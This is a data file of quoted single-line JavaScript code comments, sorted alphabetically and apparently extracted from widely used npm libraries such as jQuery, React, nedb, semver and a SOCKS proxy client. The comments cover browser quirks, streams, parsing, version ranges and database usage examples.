"// Gets hook for the prefixed version, then unprefixed version"
"// Given an array of nodes, remove any member that is contained by another."
"// Given its name, create the complete modifier function"
"// Go through every key on the object,"
"// Go through the array, only saving the items"
"// Go through the array, translating each of the items to their new values"
"// Got a ""function"" expression/statement,"
"// Group markup by `nodeName` if a wrap is necessary, else by '*'."
"// Guard against undefined ""subtract"", e.g., when used as in cssHooks"
"// HANDLE: $(""""), $(null), $(undefined), $(false)"
"// HANDLE: $(expr, $(...))"
"// HANDLE: $(expr, context)"
"// HANDLE: $(html, props)"
"// HFS, ext{2,3}, FAT do not, Node.js v0.10 does not"
"// HTML entities should already be decoded by the parser, so no need to decode them"
"// HTML, we want to make sure that it's a safe tag."
"// HTTP, HTTPS, or SOCKS proxy to use"
"// Hallo, world!\n': {"
"// Handle Promises/A+ spec, then could be a getter"
"// Handle iff the expected data type is ""jsonp"" or we have a parameter to set"
"// Handle: [ owner, key, value ] args"
"// Handle: [ owner, { properties } ] args"
"// Handles objects with the built-in `forEach`, arrays, and raw objects."
"// Hebrew model prober, the model prober forwards the call to the"
"// Hebrew. Disjointed from the model probers, the results of the HebrewProber"
"// HebrewProber is passed to the model probers as a helper ""Name Prober""."
"// HebrewProber to make the final decision. In the HebrewProber, the"
"// Hello, world!\n': {"
"// Hello, world!\n42': {"
"// Hello, world!\n\n//   Another hello\n42': {"
"// Here we use asap to wait until all updates have propagated, which"
"// Here, the underlying file is 3 lines long for only one document"
"// Hint to use ""Connection: close"""
"// Historically, SourceMapConsumer did not take the sourceMapURL as"
"// However, `1.2.4-alpha.notready` should NOT be allowed,"
"// However, if we're not ended, or reading, and the length < hwm,"
"// However, it will usually result in less memory allocation"
"// However, some Function.prototype methods cannot be overwritten,"
"// However, some cases require setting options to different"
"// Hyphen, followed by one or more dot-separated pre-release version"
"// ID optimization LTR, to reduce selection context searches"
"// ID optimization RTL, to reduce number of elements to visit"
"// IE 11 uses modern selection, but doesn't support the extend method."
"// IE 8 throws on Object.getOwnPropertyDescriptor(arguments, '')"
"// IE only: when a SWF is loading (AND: not available in cache) wait for the readyState of the object element to become 4 before removing it,"
"// IE throws exception if url is malformed, e.g. http://example.com:80x/"
"// IE10+ fire input events to often, such when a placeholder"
"// IE8 can throw ""Can't move focus to the control because it is invisible,"
"// IE8 does not implement `charCode`, but `keyCode` has the correct value."
"// IE8 throws ""Invalid argument."" if resetting shorthand style properties."
"// INVALID_CHARACTER_ERR exception and abort these steps."""
"// Ideally, we would use"
"// Ideally, you would take the body in the response"
"// Identical objects are equal. `0 === -0`, but they aren't identical."
"// Identifier node, we switch to interpreting it as a label."
"// If ""error"" event has no listeners,"
"// If ""name"" is an array of keys..."
"// If ""type"" variable is undefined, then ""GET"" method will be used."
"// If '/' concats with '/' or `<` concats with `!--`, it is interpreted as comment start"
"// If --no-deprecation is set, then it is a no-op."
"// If A is deeper, crawl up."
"// If B is deeper, crawl up."
"// If IndexedDB isn't available, we get outta here!"
"// If IndexedDB isn't available, we'll fall back to localStorage."
"// If Underscore is called as a function, it returns a wrapped object that"
"// If WebSQL methods aren't available, we can stop now."
"// If _read called its callback synchronously, then `reading`"
"// If _read pushed data synchronously, then `reading` will be false,"
"// If `method` throws, prefer to show that stack trace over any thrown"
"// If `rootNode.form` was non-null, then we could try `form.elements`,"
"// If `str` is undefined, act as a ""getter"""
"// If `true`, then connect to the proxy server over TLS."
"// If a component is unmounted before pending changes apply, it will still"
"// If a division operator appears in an expression position, the"
"// If a document's field is an array, matching it means matching any element of the array"
"// If a hook was provided, use that value, otherwise just set the specified value"
"// If a key with the spaces exists, use it."
"// If a normal DOM Ready event fired, decrement, and wait if need be"
"// If a number was passed in, add the unit (except for certain CSS properties)"
"// If a paste event occurs after a keypress, throw out the input"
"// If a port is specified explicitly, use it as is"
"// If a result was found, parse it from the serialized"
"// If a selector was specified, locate the right elements in a dummy div"
"// If a sort is defined, wait for the results to be sorted before applying limit and skip"
"// If a string URI/URL was given, parse it into a URL object"
"// If a symbolic link is encountered on Windows, all bets are off."
"// If a variable is not specified, place data values in local scope."
"// If aSourceFile is omitted, we will use the file property of the SourceMap"
"// If additional callbacks are queued before the queue is flushed, they"
"// If an array was passed in, assume that it is an array of form elements."
"// If an error happened, we need to rollback the insert on all other indexes"
"// If an error happened, we need to rollback the update on all other indexes"
"// If an error was raised, roll back changes in the inverse order"
"// If an existing socket is provided, use it to negotiate SOCKS handshake. Otherwise create a new Socket."
"// If an insert fails due to a unique constraint, roll back all inserts before it"
"// If an offset was given, check to see if we wrote beyond the current writeOffset."
"// If an offset was provided and its not the very end of the buffer, copy data into appropriate location in regards to the offset."
"// If an offset was provided, use it."
"// If an offset was provided, validate it."
"// If any part of a line is indentation-locked, the whole line"
"// If both nodes are subtypes of Expression, then we should be"
"// If called from an script element directly (during the first tick),"
"// If change and propertychange bubbled, we'd just bind to it like all the"
"// If checking deeply and vDef === this, then we only need to call"
"// If curCSS returns percentage, fallback to offset"
"// If data is available, append data to url"
"// If debug isn't set in LS, and we're in Electron, try to load $DEBUG"
"// If either the owner or a `ref` has changed, make sure the newest owner"
"// If enabled, skip leading hashbang line."
"// If error is not defined, the send has been completed, otherwise the error"
"// If event changes its type, use the special event handlers for the changed type"
"// If filters are necessary (rotation exists), create them"
"// If given host is 0.0.0.0, assume remote proxy ip instead."
"// If handleInvalidRegexFlag is true, an invalid flag in a regular expression"
"// If host is 0.0.0.0, set to proxy host."
"// If isFunction.check(from), and from is not a built-in"
"// If it fails, this function gets ""jqXHR"", ""status"", ""error"""
"// If it is a regular function declaration in sloppy mode, then it is"
"// If it is, jump forward by the specified size (round up to 512)"
"// If it receives a jQuery object, the first element is used"
"// If it's a named group, preserve the name. Otherwise, use the subpattern name"
"// If it's a spacebar character, assume that we have already handled"
"// If it's determined that a component should not update, we still want"
"// If it's not, then references will be corrected by frame/iframe code."
"// If it's the only child, treat the name as if it was wrapped in an array"
"// If jumping to earlier lines, reset columns to the ends of"
"// If jumping to later lines, reset columns to the beginnings"
"// If length is 1, that means that we need to schedule an async flush."
"// If listening to data, and it has not explicitly been paused,"
"// If localStorage isn't available, we get outta here!"
"// If localforage is ready and fully initialized, we can't set"
"// If name is '__proto__', and Object.defineProperty is available, define __proto__ as an own property on target"
"// If newNode.original node was set to null, reprint the node."
"// If newTree is undefined, that means its structure was not modified"
"// If nextSibling is non-null, set the referenceNode attribute to nextSibling"
"// If no ImportClause is present,"
"// If no argument is given, return whether or not list has callbacks attached."
"// If no characters are being inserted, no BeforeInput event should"
"// If no document is found, doc is null"
"// If no document is found, docs is equal to []"
"// If no location is provided, return the complete Lines object."
"// If no nodeType, this is expected to be an array"
"// If no numeric offset was given, we wrote to the end of the SmartBuffer so increment writeOffset."
"// If no offset was given, we wrote to the end of the SmartBuffer so increment writeOffset."
"// If no proxyUri is specified, then https://www.npmjs.com/package/proxy-from-env"
"// If no transport, we auto-abort"
"// If nobody prevented the default action, do it now"
"// If node is something like a window, document, or text node, none of"
"// If none found, seek a pair"
"// If none is provided, the default one can compare numbers, dates and strings"
"// If not a stateless component, we now render"
"// If not enough arguments are provided, the default value for the remaining fields"
"// If not found, move on"
"// If not, an exception will be thrown."
"// If not, create one"
"// If not, methods calling randombytes will throw."
"// If not, treat it as an array of { obj, query } where there needs to be at least one match"
"// If nothing was found internally, try to fetch any"
"// If obj is provided, the promise aspect is added to the object"
"// If our lower bound is less than our upper bound, we (1) partition the"
"// If path.value disagrees with parentValue[path.name], and"
"// If performUpdateIfNecessary happens to enqueue any new updates, we"
"// If pos.column does not exceed the indentation amount, then"
"// If previous iteration zeroed out, double until we get *something*."
"// If provided, this option will be passed along to the source map"
"// If removed from array, then decrease following items' keys."
"// If request was aborted inside a prefilter, stop there"
"// If request was aborted inside ajaxSend, stop there"
"// If resolveValues consist of only a single Deferred, just use that."
"// If root is an inclusive ancestor of next, set the referenceNode"
"// If seed is empty or no tokens remain, we can return early"
"// If selected Socks v5 auth method is no auth, send final handshake request."
"// If selected Socks v5 auth method is the custom_auth_method, send custom handshake."
"// If selected Socks v5 auth method is user/password, send auth handshake."
"// If selected element isn't a tag, move on"
"// If selector defined, determine special event api type, otherwise given type"
"// If self.tunnelOverride is set (the user specified a value), use it."
"// If set returns undefined, fall back to normal setting"
"// If setEncoding(null), decoder.encoding equals utf8"
"// If sock is undefined, assign it here."
"// If spaces are odd number, above pattern is considered."
"// If successful, handle type chaining"
"// If target is omitted, writes into ajaxSettings."
"// If the _sourcesContents map is empty, set the property to null."
"// If the app is running inside a Google Chrome packaged webapp, or some"
"// If the array expression ends with a hole, that hole"
"// If the array is large and already in sort order, pass `true`"
"// If the browser doesn't supply us with indexOf (I'm looking at you, **MSIE**),"
"// If the callback needs to know the value of i, call"
"// If the checksum is invalid, that's our position to start writing"
"// If the code includes a valid, prologue position"
"// If the current capture has a name, preserve the name"
"// If the data starts with BOM, we know it is UTF"
"// If the date is in the future (less than an hour from now), year"
"// If the date is in the past but no more than 6 months old, year"
"// If the delimiter matched an empty string, avoid an infinite loop"
"// If the destination is HTTPS, tunnel."
"// If the difference is below this, don't rely at all on the model score distance."
"// If the difference is below this, don't rely solely on the final letter score distance."
"// If the element has a class name or if we're passed `false`,"
"// If the error handler throws, it is not catchable and it"
"// If the final letter score distance is dominant enough, rely on it."
"// If the function hasn't returned already, we're confident that"
"// If the fx queue is dequeued, always remove the progress sentinel"
"// If the index of `child` is less than `lastIndex`, then it needs to"
"// If the input is a non-prerelease version, this acts the same as"
"// If the leading space contains newlines, then replace it"
"// If the leading space contains no newlines, then we want to"
"// If the next field is an integer, return only this item of the array"
"// If the node and offset values are the same, the selection is collapsed."
"// If the node has any comments, their locations might contribute to"
"// If the node has been found to be unique, re-insert it."
"// If the nodes are siblings, we can do a quick check"
"// If the only part of the root that is left is the scheme (i.e. http://,"
"// If the options argument is an object, we use it to set values."
"// If the original range is shorter than the simplified one, return that."
"// If the parent and child instances have a common owner ancestor, start"
"// If the parent node has type DeclareExportDeclaration, then it"
"// If the parent node is an export declaration, it will be"
"// If the preceding token was a descendant combinator, insert an implicit any-element `*`"
"// If the previous token is a dot, this does not apply because the context-managing code already ignored the keyword"
"// If the request succeeds, this function gets ""data"", ""status"", ""jqXHR"""
"// If the response content is being decoded, the Content-Encoding header"
"// If the selector is sufficiently simple, try using a ""get*By*"" DOM method"
"// If the simple way fails, read from inside an iframe"
"// If the source was empty, some parsers give loc.{start,end}.line"
"// If the super class is an expression, we need to memoize the output of the"
"// If the trailing space contains newlines, then replace it"
"// If the trailing space contains no newlines, then we want to"
"// If the user unpiped during `dest.write()`, it is possible"
"// If the user uses them, then switch into old mode."
"// If the value is null (e.g., no specified value or after initial mount)"
"// If the writable side ended, then we're ok."
"// If there are functions bound, to execute"
"// If there are no quasi elements, then there is nothing to fix."
"// If there is a unique constraint on field 'a', this will fail"
"// If there is already a '_' parameter, set its value"
"// If there is an error parsing the URL, assume it is crossDomain,"
"// If there is no closing brace, make the node span to the start"
"// If there is no value set (e.g. `undefined`, `null`), then return nothing"
"// If there was a parsing error, it would have been caught."
"// If there was an error, err is not null"
"// If there was an error, this function would be skipped."
"// If there was no visitor method to call, visit the children of"
"// If there's a baseUrl, then use it as the base URL (i.e. uri must be"
"// If there's a remainder, just add whatever is left"
"// If there's more than one initial capital letter, lower-case"
"// If there's no constructor method specified in the class body, create an"
"// If there's only one initial capital letter, just lower-case it."
"// If this Def is already buildable, update self.buildParams and"
"// If this flag is set to constants.True, detection is done and conclusion has been made"
"// If this flag is set to true, detection is done and conclusion has been made"
"// If this is a DOM element, try to get the outer HTML."
"// If this is a controlled radio button group, forcing the input that"
"// If this is a noop like .hide().hide(), restore an overwritten display value"
"// If this is a positional/relative selector, check membership in the returned set"
"// If this is a pre-major version, bump up to the same major version."
"// If this is a pre-minor version, bump up to the same minor version."
"// If this is a strict mode function, verify that argument names"
"// If this is already a prerelease, it will bump to the next version"
"// If this is not a pre-release version, it will increment the patch."
"// If this throws again, the error will bubble up (and can be caught by a higher error boundary)."
"// If this.traverse still hasn't been called, visit the"
"// If traditional, encode the ""old"" way (the way 1.3.2 or older"
"// If true, will turn on the underlying sockets TCP_NODELAY option."
"// If u flag is given, this returns the code point at the index (it combines a surrogate pair)."
"// If upsert option is set, check whether we need to insert the doc"
"// If url is an object, simulate pre-1.5 signature"
"// If using CONNECT, the client is now in the established state."
"// If using a custom auth method, specify the type here. If this is set, ALL other custom_auth_*** options must be set as well."
"// If using an escape character, advance to the delimiter's next starting position,"
"// If using innerHTML throws an exception, use the fallback method"
"// If value is a function, invoke it and return its value"
"// If we already have the right measurement, avoid augmentation"
"// If we are collecting the tokens, don't grab the next one yet."
"// If we are currently composing (IME) and using a fallback to do so,"
"// If we are going to the end, we want to run all the tweens"
"// If we aren't using plain objects, optionally prefix keys that would overwrite object prototype properties"
"// If we aren't using plain objects, optionally prefix keys"
"// If we can parse it, it's a valid absolute URL."
"// If we couldn't infer the Def associated with the given value,"
"// If we do, and either it's flowing, or it has never had any data"
"// If we do, it will only be ready once loadDatabase is called"
"// If we don't have a context, maybe we have a root, from loading"
"// If we don't know, then assume that we are waiting for one."
"// If we don't, then we definitely can handle more data."
"// If we get here before consuming all the bytes, then that is a"
"// If we get something that is not a buffer, string, null, or undefined,"
"// If we had tested against ""Mars"" docs would be empty because we are matching against a specific array element"
"// If we had used a fruit not in the array, e.g. 'banana', it would have been added to the array"
"// If we have a postFinder, or filtered seed, or non-seed postFilter or preexisting results,"
"// If we have an array of values (e.g. `<select multiple>`), return an array of key/value pairs"
"// If we have data, let's convert it"
"// If we have elements to modify, make the request"
"// If we have enough data to process the next step in the SOCKS handshake, proceed."
"// If we have memory from a past run, we should fire after adding"
"// If we have no .loc information for oldNode, then we won't"
"// If we have no .loc information for oldNode, then we"
"// If we have nothing in the buffer, then we want to know"
"// If we haven't returned by now, then the 'async' keyword was not"
"// If we include width, step value is 1 to do all cssExpand values,"
"// If we insert a new document { _id: 'id6', fruits: ['apple', 'orange', 'pear'] } in the collection,"
"// If we return false, then we need a drain event, so set that flag."
"// If we saw typeName earlier in the breadth-first traversal,"
"// If we still don't have a context, return"
"// If we tried to read() past the EOF, then emit end on the next tick."
"// If we're asking for more than the current hwm, then raise the hwm."
"// If we're asking for more than the target buffer level,"
"// If we're here with a time that is more than 6 months old, there's"
"// If we're in Chrome or Firefox, provide a download link if not installed."
"// If we're in IE8, check to see if we are in compatibility mode and provide"
"// If we're in an ES6 environment, make parsers iterable"
"// If we're not waiting on anything, resolve the master"
"// If we're switching from children to content/html or vice versa, remove"
"// If we're updating to null or undefined, we should remove the property"
"// If we're warning about an invalid (non-parent) ancestry, add '...'"
"// If we've already got an array, just append."
"// If we've reached the last proxy in the chain, the destination is the actual destination, otherwise it's the next proxy."
"// If you are using a JS minifier that mangles parameter names, `autoInject`"
"// If you choose to use recast.builders to construct new AST nodes, all builder"
"// If you decide to catch this exception and stop it from propagating,"
"// If you have no idea what ASN.1 or BER is, see this:"
"// If you pass the wrong type of arguments, or fail to pass enough"
"// If you set a process.env field to null or undefined, it gets cast to the"
"// If you upsert with a modifier, the upserted doc is the query modified by the modifier"
"// If you want to override the quotes used in string literals, specify"
"// If you want to print trailing commas in object literals,"
"// If you want to use a different branch of esprima, or any other"
"// If you want, you can extend native methods so you don't have to worry about this"
"// If you're updating this function definition, please also update any"
"// Immediate errors can also be handled with `try...catch`, but **note** that"
"// Immediately after `j` is incremented in this loop, the following hold"
"// Implement an async ._write(chunk, cb), and it'll handle all"
"// Implement an async ._write(chunk, encoding, cb), and it'll handle all"
"// Implicit octal, unless there is a non-octal digit."
"// In CSS3, :checked should return both checked and selected elements"
"// In Firefox, range.startContainer and range.endContainer can be ""anonymous"
"// In IE, errors have a single `stack` property, or if they are vanilla `Error`,"
"// In IE8, `mountAt` is a host object and doesn't have `hasOwnProperty`"
"// In IE8, we can capture almost all .value changes by adding a"
"// In IE9+, we have access to composition events, but the data supplied"
"// In IE9, reads to any property (e.g. status) off of an aborted XHR will"
"// In IE9-11, propertychange fires for most input events but is buggy and"
"// In Node.JS, `module` is a predefined object, which makes the QUnit `module` definitions fail"
"// In `return` (and `break`/`continue`), the keywords with"
"// In case of <template> we should pass its ""template contents"" fragment as a serialization root if we have one"
"// In case you didn't know, the caught parameter shadows any variable"
"// In certain cases it's possible for targetLoc.{start,end}.column"
"// In early versions of node, obj['__proto__'] is buggy when obj has"
"// In either case, we don't want to call the event handler if the value"
"// In email addresses, only the domain name should be punycoded. Leave"
"// In fact, all XRegExps are RegExps and work perfectly with native methods"
"// In modern browsers (i.e., not IE8 or IE9), the input event is exactly"
"// In ms, an upper bound for the reload time used to check createdAt and updatedAt"
"// In other words, `node.right` shouldn't contain logical expressions in order to check the mixed error."
"// In particular, this system allows for circular and forward definitions."
"// In principal, you could also find out the number of preceding siblings"
"// In reality, path.parent is the grandparent of path:"
"// In streams that never have any data, and do push(null) right away,"
"// In that case, the user has opted out of path protections"
"// In that case, we dilute the color to make the line look thinner."
"// In the case of any other error, just see if there's a dir there"
"// In the case of any other error, just see if there's a dir"
"// In: [1, 2, 3,]"
"// Incidentally, this tests that obj was not modified"
"// Incorporate the offset, then check against cycle size"
"// Increase `delta` enough to advance the decoder's <n,i> state to <m,0>,"
"// Incrementing an initially-string ""0"" `i` allows `i` to remain a string only in that"
"// Indexed by field name, dot notation can be used"
"// IndexedSourceMapConsumer.prototype.sourceContentFor. In that case, we"
"// Init the element's event structure and main handler, if this is the first"
"// Initialize arcfour context from key, an array of ints, each from [0..255]"
"// Initialize the config, saving the execution queue"
"// Insert doc has two new fields, _id and createdAt"
"// Insert in the internal tree, update the pointer to the root if needed"
"// Inspired by require(""ast-types"").NodePath.prototype.needsParens, but"
"// Integer division by 2, mod q"
"// Integer, meaning increasing sequence starting with prev character."
"// Intentional (non-timeout) abort is supposed to preserve partial response,"
"// Internal instances should fully constructed at this point, so they should"
"// Invalid URI: it may generate lot of bad errors, like 'TypeError: Cannot call method `indexOf` of undefined' in CookieJar"
"// Invoke `renewToken` when the click event is fired, but not more than once every 5 minutes."
"// Invoke `sendMail` when clicked, debouncing subsequent calls."
"// Invoke the callback on just the original child paths, regardless of"
"// Invokes interceptor with the obj, and then returns obj."
"// Is a given array, string, or object empty?"
"// It also calls `Buffer.concat()` at the end, which may be convenient"
"// It is a full dirname, strip trailing slash"
"// It is forgiving, closer to standard UTF-7 (for example, '-' is optional at the end)."
"// It is not necessary to receive all data to draw conclusion. For charset detection,"
"// It is possible for the path to be above the root. In this case, simply"
"// It needs to return a negative number if a is less than b,"
"// It should not fail on enosys ever, as this just indicates"
"// It would only be possible if we had proper getters/setters for every event handler, which we don't right now."
"// It'd be very memory-expensive in most cases, though."
"// It's a high surrogate, and there is a next character."
"// It's an unmatched surrogate; only append this code unit, in case the"
"// It's especially important to clear out the listeners here because document.close() causes a ""load"" event to"
"// It's impossible to fix without knowing about the server's timezone,"
"// It's not an error to finalize a type more than once, but only the"
"// It's not dominant enough, try to rely on the model scores instead."
"// It's possible that node is newly-created (not parsed by Esprima),"
"// Item is non-scalar (array or object), encode its numeric index."
"// Iterate backwards through tiesToBreak, examining the gaps"
"// Iterate over all defined fields of an object, including those missing"
"// Iterate until either we run out of mappings, or we run into"
"// Iterator will provide entry [k,v] tuples rather than values."
"// JIS X 0208 - Main set of 6879 characters, placed in 94x94 plane, to be encoded by 2 bytes. "
"// JIT'd JS is rather slow *and* loses JIT type information, resulting in"
"// JS multiply ""overflows"" differently from C/C++, so care is needed here."
"// JSON.stringify can throw, emit an error on that"
"// JavaScript micro-templating, similar to John Resig's implementation."
"// Jobs run automatically. If you want a callback when all are done,"
"// Just for fun, because addition is commutative:"
"// Keep both the (mapped) and old keys if they differ, just as"
"// Keep track of which events have ever been used, for event optimization"
"// Key not found, no modification"
"// Key: """" Value: {""a"":1,""o"":""[Circular]""}"
"// Key: ""a"" Value: 1"
"// Key: ""o"" Value: ""[Circular]"""
"// KeyPress is deprecated, but its replacement is not yet final and not"
"// Keys separate source (or catchall ""*"") and destination types with a single space"
"// Kind of weird to have a default max of Infinity, but oh well."
"// LOAD_NODE_MODULES(X, START)"
"// LOAD_PACKAGE_EXPORTS(X, DIR)"
"// LOAD_PACKAGE_IMPORTS(X, DIR)"
"// LOAD_PACKAGE_SELF(X, DIR)"
"// Leading and non-escaped trailing whitespace, capturing some non-whitespace characters preceding the latter"
"// Leave this path cached as parentCache[this.name], even though"
"// Left is not too small, don't change"
"// Legacy API: addRequest(req, host, port, path)"
"// Lengthen the array for every element, matched or not"
"// Let's use the same example collection as in the ""finding document"" part"
"// Like .check, except that failure triggers an AssertionError."
"// Like ModuleSpecifier, except type:""ExportSpecifier"" and buildable."
"// Like ModuleSpecifier, except type:""ImportSpecifier"" and buildable."
"// Like Object.keys, but aware of what fields each AST type should have."
"// Likewise, path.parentPath is named for the property by which"
"// Likewise, some parsers accidentally include the } that follows"
"// Line comment starts with '//' (char #47, char #47)."
"// Lines objects are immutable, so it's perfectly adequate to"
"// Logical Hebrew - ""windows-1255"" - normal, naturally ordered text."
"// Login Failed!"");"
"// Look for any active animations, and finish them"
"// Loop through the hierarchy, in case there's any nested components."
"// M, m, patch, prerelease, build"
"// MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN"
"// Make ""aSourceFile"" relative if an absolute Url is passed."
"// Make ""sourceFile"" relative if an absolute Url is passed."
"// Make sure that the ""type"" field was filled automatically."
"// Make sure that the handler has a unique ID, used to find/remove it later"
"// Make sure that this path refers specifically to a Node, rather than"
"// Make sure we add a ""../"" for each component we removed from the root."
"// Make the changes, replacing each non-ignored context element with the new content"
"// Make this explicit, since user can override this through ajaxSetup (#11264)"
"// Margin is only for outerHeight, outerWidth"
"// Mars document now is { _id: 'id1', system: 'solar', inhabited: false"
"// Meaning is ""at least and backwards compatible with"""
"// Meaning is ""reasonably at or greater than"""
"// Mimic old behavior, could throw but didn't pass a test."
"// Missing scheme in proxy, default to the requested URL's scheme."
"// Modify $obj, Do not return"
"// Modular reduction using ""classic"" algorithm"
"// Most of the time, the content has ASCII chars (U+00**), but the opposite (U+**00) is uncommon."
"// Multibyte codec. In this scheme, a character is represented by 1 or more bytes."
"// Multiple visitors may be applied at once, so an"
"// Must force callback to be called on nextTick, so that we don't"
"// Must reset `isInsideConstructor`, even if a `trigger` or `handler` throws"
"// N milliseconds. If `immediate` is passed, trigger the function on the"
"// N=4000, 2.5s"
"// N=4000, 26.5s"
"// N=4000, 47.8s then crash, can't get string (with N=5000 crash happens on second pass)"
"// N=4000, 8.0s"
"// N=5000, 108s"
"// N=5000, 137s"
"// N=5000, 141s"
"// N=5000, 169s"
"// N=5000, 18s"
"// N=5000, 208s"
"// N=5000, 281s"
"// N=5000, 350s"
"// N=5000, 69s"
"// N=50000, 0.5s"
"// N=50000, 0.7s"
"// NB: In an Electron preload script, document will be defined but not fully"
"// NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,"
"// NOTE: Advanced use-case, for normal use see 'formData' usage above"
"// NOTE: This can be skipped if there are no unmatched elements (i.e., `matchedCount`"
"// NOTE: menuitem's close tag should be omitted, but that causes problems."
"// NOTE: per https://heycam.github.io/webidl/#Global, all properties on the Window object must be own-properties."
"// Naive implementation, but it works because CESU-8 is especially easy"
"// Name,Type,Length,Not Null,Key,Auto Increment"
"// Named function, e.g. function f(){} /42/"
"// Native objects stringify to [object File], [object Blob], [object FormData], etc."
"// Need to wait for the ""socket"" event to re-play the ""data"" events."
"// Needed because $( selector, context ) becomes $( context ).find( selector )"
"// Nested array in a subdocument of an array (yay, inception!)"
"// Never move original objects, clone them"
"// New HTML5 attribute values (e.g., ""search"") appear with elem.type === ""text"""
"// No HAS_SIDE_EFFECTS logic here, only `value` has it and is string."
"// No argument, return index in parent"
"// No baseName, so this is ID is resolved relative"
"// No more remaining code, continue"
"// No more than 30ms should have elapsed (worst case, if there is a flush)"
"// No need to check if the test was already performed, though."
"// No need to pop anything from newPath.stack or oldPath.stack, since"
"// No special behavior since these rules fall back to ""in body"" mode for"
"// No wildcards, so stop proxying if there is an exact match."
"// Node v6 didn't export this, so we just hard code the version and rely"
"// Node with only one child (on the left), causes rebalancing"
"// Node, which happens to be the same as path.parent.node:"
"// Node. Does not work with strict CommonJS, but"
"// Node. Instead, path.parentPath.node refers to the closest ancestor"
"// Node.js LazyTransform implementation, which has a non-trivial getter for"
"// Nodes with decorators can't have parentheses, so we can avoid"
"// Non-direct chars are encoded as ""+<base64>-""; single ""+"" char is encoded as ""+-""."
"// Non-existent attributes return null, we normalize to undefined"
"// Normal character, just use it."
"// Normalize """", auto, and prepare for extra"
"// Normalize opt.queue - true/undefined/null -> ""fx"""
"// Normally we'd insert a comment node, but since this is a situation"
"// Normally you'd read this from the filesystem, but I'll just use a string here"
"// Not ""accessibility""?"
"// Not a dir entry, have to remove it."
"// Not completely spec compliant due to e.g. incomplete implementations of disabled for form controls, or no"
"// Not listening for removeListener, no need to emit"
"// Not public - generate a queueHooks object, or return the current one"
"// Not quite $.extend, this won't overwrite existing keys."
"// Not supported by iconv, not sure why."
"// Not that to set fields in subdocuments, you HAVE to use dot-notation"
"// Note that ""x.x"" is a valid xRange identifer, meaning ""any version"""
"// Note that 'yield' is treated as a keyword in strict mode, but a"
"// Note that ParentNode is a ""NoInterfaceObject"""
"// Note that for maximum portability, libraries that are not jQuery should"
"// Note that for-in statements are left unmodified, as they do not have a"
"// Note that on windows, we always drop the entire cache whenever a"
"// Note that since a copy is used, `search`'s `lastIndex` isn't updated *during* replacement iterations"
"// Note that the _id is kept unchanged, and the document has been replaced"
"// Note that the only major, minor, patch, and pre-release sections of"
"// Note that the visitor object is the prototype of Context.prototype,"
"// Note that these all use the loose form, because they'll be"
"// Note that this may be asynchronous, or synchronous.  Yes, it is"
"// Note that this will throw on failure, which will fail the test."
"// Note that undefined fields will be visited too, according to"
"// Note that windows will think that //x/y/z/a has a ""root"" of //x/y, and in"
"// Note: 0 is a valid value, means ""don't call _read preemptively ever"""
"// Note: 0 is a valid value, means that we always return false if"
"// Note: As of Tor v0.3.5.7+, if user/pass auth is an option from the client, by default it will always take priority."
"// Note: The comments on the `throw` lines are intentional, they show"
"// Note: This function is called only from parseObjectProperty(), where"
"// Note: We do not allow listening to mouseOver events. Instead, use the"
"// Note: button is not normalized, so don't use it"
"// Note: difference from C - smlen returned, not passed as argument."
"// Note: esprima can't actually parse ""for each (""."
"// Note: not polyfilled with safer-buffer on a purpose, as overrides Buffer"
"// Note: you can't use nested comparison functions, e.g. { $size: { $lt: 5 } } will throw an error"
"// Nothing to do, no data corruption possible in the brower"
"// Nothing to do, no directories will be used on the browser"
"// Now do some stuff that might rearrange the list, and this replacement"
"// Now the fruits array is ['apple', 'orange', 'pear', 'banana', 'orange']"
"// Now the fruits array is ['apple', 'orange', 'pear', 'banana']"
"// Now the fruits array is ['apple', 'orange']"
"// Now the fruits array is ['orange', 'pear']"
"// Now, the file has been compacted and is only 1 line long"
"// OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF"
"// OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE"
"// Object type used to represent tokens. Note that normally, tokens"
"// Objects with different constructors are not equivalent, but `Object`s"
"// Old API was `parse([argv, [slice]])`"
"// Older IE sometimes signals ""interactive"" too soon"
"// Oldest GB2312 (1981, ~7600 chars) is a subset of CP936"
"// Omits script parameter and any check for muted errors; takes error object, message, and location as params, unlike"
"// Omitting unneeded parts with null valueNames, and using escapeChar"
"// On a manual native abort, IE9 throws"
"// On some platforms, in particular some releases of Android 4.x,"
"// On the selectionchange event, the target is just document which isn't"
